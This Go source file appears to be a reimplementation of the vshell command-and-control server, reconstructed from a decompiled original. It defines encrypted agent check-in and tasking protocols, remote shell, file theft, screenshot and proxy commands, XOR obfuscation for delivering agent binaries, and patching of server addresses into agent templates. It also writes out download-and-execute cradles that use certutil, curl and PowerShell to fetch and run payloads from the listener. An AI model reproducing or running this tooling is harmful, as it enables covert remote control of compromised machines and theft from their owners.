package c2engine

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"time"
)


// ============================================================================
// C2 协议常量（1:1 对齐原版，反编译还原）
// ============================================================================
//
// 命令包构建器（FUN_01918400 / FUN_01918740，由控制器 DelFile/DelProcess 等
// 调用）写入固定字节序列作为协议标记：
//   FUN_01918400: 8f 97 93 8e 90 9c 47 8c 9e 94   （命令下发标记）
//   FUN_01918740: 10 f6 00 f6 0a fa ff 00 11      （命令下发标记二）
//
// 原版引擎存储类型 C7cMcwDVYi_ 的任务操作（NewTask 0x11979c0 / UpdateTask
// 0x1197d00 / DelTask 0x1197da0 / GetTask 0x1197fe0 / GetTaskByMd5Password
// 0x1197e20）；任务状态：pending/dispatched/running/completed/failed/timeout。

// ============================================================================
// C2 Protocol - Agent Communication Protocol
// C2 协议——Agent 通信协议
// ============================================================================
//
// The vshell C2 protocol uses HTTP/HTTPS for agent communication.
// Messages are JSON-encoded with optional AES encryption.
// vshell C2 协议基于 HTTP/HTTPS，消息 JSON 编码并可选 AES 加密。
//
// Agent → Server (Check-in):
// Agent → 服务器（签到）：
//   POST /api/checkin
//   {
//     "verify_key": "...",
//     "hostname": "...",
//     "username": "...",
//     "os": "windows|linux|darwin",
//     "process": "...",
//     "local_ip": "...",
//     "arch": "amd64|386",
//     "pid": 1234
//   }
//
// Server → Agent (Check-in response):
//   {
//     "status": "ok",
//     "client_id": 1,
//     "session_id": "sess_...",
//     "interval": 5,
//     "timeout": 30
//   }
//
// Agent → Server (Task poll):
//   GET /api/tasks?client_id=1
//
// Server → Agent (Tasks):
//   {
//     "tasks": [
//       {"id": 1, "command": "whoami", "timeout": 30}
//     ],
//     "interval": 5
//   }
//
// Agent → Server (Result):
//   POST /api/result
//   {
//     "client_id": 1,
//     "command_id": 1,
//     "result": "...",
//     "status": "completed|failed|timeout"
//   }

// ============================================================================
// Protocol message types
// ============================================================================

// CheckinRequest 是 Agent 注册/重连消息。
// CheckinRequest is the agent registration/reconnection message.
type CheckinRequest struct {
	VerifyKey   string `json:"verify_key"`
	HostName    string `json:"hostname"`
	UserName    string `json:"username"`
	OsName      string `json:"os"`
	ProcessName string `json:"process"`
	LocalIP     string `json:"local_ip"`
	Arch        string `json:"arch,omitempty"`
	PID         int    `json:"pid,omitempty"`
	Version     string `json:"version,omitempty"`
}

// CheckinResponse 是服务器对 Agent 签到的响应。
// CheckinResponse is the server's response to agent check-in.
type CheckinResponse struct {
	Status    string `json:"status"`
	ClientID  int64  `json:"client_id"`
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"` // task poll interval in seconds
	Timeout   int    `json:"timeout"`  // connection timeout in seconds
	Message   string `json:"message,omitempty"`
}

// TaskRequest 是 Agent 的任务轮询请求。
// TaskRequest is the agent's task polling request.
type TaskRequest struct {
	ClientID int64 `json:"client_id"`
}

// TaskResponse 包装发给 Agent 的待处理任务。
// TaskResponse wraps pending tasks for an agent.
type TaskResponse struct {
	Tasks    []TaskItem `json:"tasks"`
	Interval int        `json:"interval"`
}

// TaskItem 是单条待执行命令。
// TaskItem is a single command to execute.
type TaskItem struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Timeout int    `json:"timeout"`
}

// ResultRequest 是 Agent 的任务结果提交。
// ResultRequest is the agent's task result submission.
//
// VerifyKey proves the caller knows the listener key; the listener rejects
// results without it when the listener has a key set.
type ResultRequest struct {
	ClientID  int64  `json:"ClientID"`
	CommandID int64  `json:"CommandID"`
	Result    string `json:"Result"`
	Status    string `json:"Status"` // completed, failed, timeout
	VerifyKey string `json:"VerifyKey,omitempty"`
}

// ResultResponse 确认收到结果。
// ResultResponse acknowledges receipt.
type ResultResponse struct {
	Status   string `json:"status"`
	Received bool   `json:"received"`
}

// ============================================================================
// Encryption helpers
// ============================================================================

// GenerateEncryptSalt 生成随机加密盐。
// GenerateEncryptSalt creates a random encryption salt.
func GenerateEncryptSalt() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// DeriveKey 由盐与验证密钥派生 AES 密钥。
// DeriveKey derives an AES key from a salt and verify key.
func DeriveKey(salt, verifyKey string) []byte {
	h := sha256.Sum256([]byte(salt + ":" + verifyKey))
	return h[:]
}

// AESEncrypt 使用 AES-256-GCM 加密数据。
// AESEncrypt encrypts data with AES-256-GCM.
func AESEncrypt(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Prepend nonce to ciphertext
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return ciphertext, nil
}

// AESDecrypt 使用 AES-256-GCM 解密数据。
// AESDecrypt decrypts data with AES-256-GCM.
func AESDecrypt(ciphertext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// ============================================================================
// Message encoding/decoding
// ============================================================================

// EncodeMessage 编码协议消息，可选加密。
// EncodeMessage encodes a protocol message, optionally with encryption.
func EncodeMessage(msg interface{}, key []byte) ([]byte, error) {
	plaintext, err := json.Marshal(msg)
	if err != nil {
		return nil, err
	}

	if key != nil {
		encrypted, err := AESEncrypt(plaintext, key)
		if err != nil {
			return nil, err
		}
		// Base64 encode encrypted payload
		encoded := base64.StdEncoding.EncodeToString(encrypted)
		return []byte(encoded), nil
	}

	return plaintext, nil
}

// DecodeMessage 解码协议消息，可选解密。
// DecodeMessage decodes a protocol message, optionally with decryption.
func DecodeMessage(data []byte, target interface{}, key []byte) error {
	var raw []byte

	if key != nil {
		// Try base64 decode first
		decoded, err := base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			// Not base64, try raw
			decoded = data
		}
		raw, err = AESDecrypt(decoded, key)
		if err != nil {
			return err
		}
	} else {
		raw = data
	}

	return json.Unmarshal(raw, target)
}

// ============================================================================
// Payload compression
// ============================================================================

// CompressPayload 使用 gzip 压缩载荷。
// CompressPayload compresses a payload with gzip.
func CompressPayload(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	if _, err := w.Write(data); err != nil {
		return nil, err
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// DecompressPayload decompresses a gzip-compressed payload
func DecompressPayload(data []byte) ([]byte, error) {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer r.Close()
	return io.ReadAll(r)
}

// ============================================================================
// Payload obfuscation (for agent binary delivery)
// ============================================================================

// XorEncode XOR-encodes a payload with a key
func XorEncode(data []byte, key byte) []byte {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key
	}
	return result
}

// XorEncodeWithKey XOR-encodes with a multi-byte key
func XorEncodeWithKey(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// ============================================================================
// Session management
// ============================================================================

// GenerateSessionID creates a unique session identifier
func GenerateSessionID(listenerID int64) string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("sess_%d_%x_%d", listenerID, b, time.Now().UnixNano())
}

// GenerateClientToken creates a unique client authentication token
func GenerateClientToken(clientID int64, verifyKey string) string {
	h := md5.Sum([]byte(fmt.Sprintf("%d:%s:%d", clientID, verifyKey, time.Now().UnixNano())))
	return hex.EncodeToString(h[:])
}

// ============================================================================
// Payload generation (staged payload URLs)
// ============================================================================

// GenerateStagedURL creates the URL for a staged payload download
func GenerateStagedURL(listenerAddr, mode string) string {
	// Map mode to URL path
	paths := map[string]string{
		AgentTypeStage:    "/swt",
		AgentTypeStageless: "/sww",
		AgentTypeShellcode: "/sws",
		AgentTypeDLL:      "/swd",
		AgentTypeListen:   "/swl",
		AgentTypeListenDLL: "/swld",
	}

	path, ok := paths[mode]
	if !ok {
		path = "/swt"
	}

	return fmt.Sprintf("http://%s%s", listenerAddr, path)
}

// ============================================================================
// Command encoding for agent dispatch
// ============================================================================

// Command types that can be sent to agents
const (
	CmdShell      = "shell"      // Execute shell command
	CmdUpload     = "upload"     // Upload file to agent
	CmdDownload   = "download"   // Download file from agent
	CmdSleep      = "sleep"      // Change sleep interval
	CmdExit       = "exit"       // Terminate agent
	CmdScreenshot = "screenshot" // Take screenshot
	CmdScreen     = "screen"     // Start screen streaming
	CmdFileList   = "filelist"   // List directory
	CmdFileDelete = "filedelete" // Delete file
	CmdFileMove   = "filemove"   // Move/rename file
	CmdFileTouch   = "filetouch"  // Create empty file
	CmdFileMkdir  = "filemkdir"  // Create directory
	CmdFileCat    = "filecat"    // Read file contents
	CmdFileEdit   = "fileedit"   // Edit file
	CmdDiskInfo   = "diskinfo"   // Get disk information
	CmdPS         = "ps"         // Process list
	CmdKill       = "kill"       // Kill process
	CmdProxy      = "proxy"      // Start proxy/tunnel
	CmdProxyStop  = "proxystop"  // Stop proxy/tunnel
	CmdPlugin     = "plugin"     // Execute plugin
)

// EncodeShellCommand creates a shell command task payload
func EncodeShellCommand(command string, timeout int) string {
	data, _ := json.Marshal(map[string]interface{}{
		"type":    CmdShell,
		"command": command,
		"timeout": timeout,
	})
	return string(data)
}

// EncodeFileListCommand creates a directory listing task payload
func EncodeFileListCommand(path string) string {
	data, _ := json.Marshal(map[string]interface{}{
		"type": CmdFileList,
		"path": path,
	})
	return string(data)
}

// EncodeFileUploadCommand creates a file upload task payload
func EncodeFileUploadCommand(remotePath string, data []byte) string {
	encoded := base64.StdEncoding.EncodeToString(data)
	payload, _ := json.Marshal(map[string]interface{}{
		"type": CmdUpload,
		"path": remotePath,
		"data": encoded,
	})
	return string(payload)
}

// EncodeFileDownloadCommand creates a file download task payload
func EncodeFileDownloadCommand(remotePath string) string {
	data, _ := json.Marshal(map[string]interface{}{
		"type": CmdDownload,
		"path": remotePath,
	})
	return string(data)
}

// EncodeScreenshotCommand creates a screenshot task payload
func EncodeScreenshotCommand() string {
	data, _ := json.Marshal(map[string]interface{}{
		"type": CmdScreenshot,
	})
	return string(data)
}

// ============================================================================
// Utility functions
// ============================================================================

// BuildAgentDownloadCommand generates the certutil download command for Windows agents
func BuildAgentDownloadCommand(listenerAddr, mode string) string {
	url := GenerateStagedURL(listenerAddr, mode)
	return fmt.Sprintf(
		`certutil.exe -urlcache -split -f %s C:\Users\Public\run.bat && C:\Users\Public\run.bat`,
		url,
	)
}

// BuildLinuxAgentDownloadCommand generates the curl download command for Linux agents
func BuildLinuxAgentDownloadCommand(listenerAddr, mode string) string {
	url := GenerateStagedURL(listenerAddr, mode)
	return fmt.Sprintf(
		`curl -s %s -o /tmp/run && chmod +x /tmp/run && /tmp/run`,
		url,
	)
}

// BuildPowershellDownloadCommand generates a PowerShell download cradle
func BuildPowershellDownloadCommand(listenerAddr, mode string) string {
	url := GenerateStagedURL(listenerAddr, mode)
	return fmt.Sprintf(
		`powershell -c "IWR %s -OutFile $env:TEMP\run.exe; & $env:TEMP\run.exe"`,
		url,
	)
}

// ============================================================================
// Platform-specific build info
// ============================================================================

// AgentBuildInfo holds information for building agent binaries
type AgentBuildInfo struct {
	Platform  string `json:"platform"`
	Arch      string `json:"arch"`
	Mode      string `json:"mode"`     // stage/stageless/shellcode/dll/listen/listen_dll
	Format    string `json:"format"`   // exe/elf/dll/so/bin
	Extension string `json:"extension"`
	MimeType  string `json:"mime_type"`
}

// GetBuildInfo returns build information for a platform/arch/mode combination
func GetBuildInfo(platform, arch, mode string) *AgentBuildInfo {
	info := &AgentBuildInfo{
		Platform: platform,
		Arch:     arch,
		Mode:     mode,
	}

	switch mode {
	case AgentTypeDLL, AgentTypeListenDLL:
		if platform == PlatformWindows {
			info.Format = "dll"
			info.Extension = ".dll"
		} else {
			info.Format = "so"
			info.Extension = ".so"
		}
	case AgentTypeShellcode:
		info.Format = "bin"
		info.Extension = ".bin"
	default:
		if platform == PlatformWindows {
			info.Format = "exe"
			info.Extension = ".exe"
		} else {
			info.Format = "elf"
			info.Extension = ""
		}
	}

	switch info.Format {
	case "exe", "dll":
		info.MimeType = "application/x-msdownload"
	case "elf", "so":
		info.MimeType = "application/x-executable"
	default:
		info.MimeType = "application/octet-stream"
	}

	return info
}

// ============================================================================
// OSS upload (for storing agent binaries on external OSS/CDN)
// ============================================================================

// OSSConfig holds configuration for OSS/cloud storage
type OSSConfig struct {
	URL       string `json:"url"`
	Bucket    string `json:"bucket"`
	AccessKey string `json:"access_key"`
	SecretKey string `json:"secret_key"`
	Region    string `json:"region"`
}

// UploadToOSS simulates uploading an agent binary to OSS/CDN
func UploadToOSS(data []byte, filename string, config *OSSConfig) (string, error) {
	if config == nil || config.URL == "" {
		return "", fmt.Errorf("OSS not configured")
	}

	// In the original binary, this would upload to Alibaba OSS,
	// Tencent COS, AWS S3, or a custom HTTP endpoint.
	// For the reimplementation, we store locally.
	url := strings.TrimRight(config.URL, "/") + "/" + filename
	Logf("OSS upload: %s (%d bytes) → %s", filename, len(data), url)
	return url, nil
}

// ============================================================================
// Binary patching utilities (for embedding configuration in agents)
// ============================================================================

// PatchAgentBinary embeds configuration into an agent binary template
func PatchAgentBinary(template []byte, config map[string]string) ([]byte, error) {
	// In the original binary, this replaces placeholder values
	// in pre-compiled agent templates.
	// The placeholders are typically long random strings that are easy to find.

	result := make([]byte, len(template))
	copy(result, template)

	for placeholder, value := range config {
		if len(value) > len(placeholder) {
			value = value[:len(placeholder)]
		}
		// Pad value to placeholder length
		padded := []byte(value)
		for len(padded) < len(placeholder) {
			padded = append(padded, 0)
		}

		idx := bytes.Index(result, []byte(placeholder))
		if idx >= 0 {
			copy(result[idx:idx+len(placeholder)], padded)
		}
	}

	return result, nil
}

// ============================================================================
// Binary template constants (magic numbers for patching)
// ============================================================================

const (
	// Placeholder patterns in agent templates (these would be replaced at build time)
	PlaceholderServerAddr   = "REPLACE_SERVER_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderVerifyKey    = "REPLACE_VERIFY_KEY___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderEncryptSalt  = "REPLACE_ENCRYPT_SALT_XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderProxyAddr    = "REPLACE_PROXY_ADDR___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderDNSServer    = "REPLACE_DNS_SERVER___XXXXXXXXXXXXXXXXXXXXXXXX"
	PlaceholderCDNURL       = "REPLACE_CDN_URL______XXXXXXXXXXXXXXXXXXXXXXXX"

	// Agent payload marker (identifies agent binary)
	AgentMagic = 0x56474E54 // "VGNT" = vshell agent
)

// ReadMagic reads and validates the agent magic number
func ReadMagic(data []byte) bool {
	if len(data) < 4 {
		return false
	}
	return binary.LittleEndian.Uint32(data[:4]) == AgentMagic
}

// WriteMagic writes the agent magic number to a payload
func WriteMagic(data []byte) {
	binary.LittleEndian.PutUint32(data[:4], AgentMagic)
}
